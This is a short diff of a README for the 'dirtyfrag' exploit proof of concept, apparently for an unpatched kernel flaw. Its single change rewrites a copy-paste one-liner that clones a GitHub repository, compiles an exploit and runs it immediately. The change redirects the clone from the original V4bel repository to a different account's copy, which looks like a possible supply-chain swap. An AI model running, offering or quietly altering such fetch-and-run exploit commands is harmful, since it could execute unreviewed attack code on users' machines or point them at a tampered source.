@@ -26,7 +26,7 @@ Because the embargo has currently been broken, no patch or CVE exists. After con
 ## One-line special
 
 ```
-git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
+git clone https://github.com/Tyler-Oliveira/dirtyfrag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
 ```
 
 This PoC is provided as accurate information following consultation with linux-distros. Do not use it on systems that you are not authorized to test.
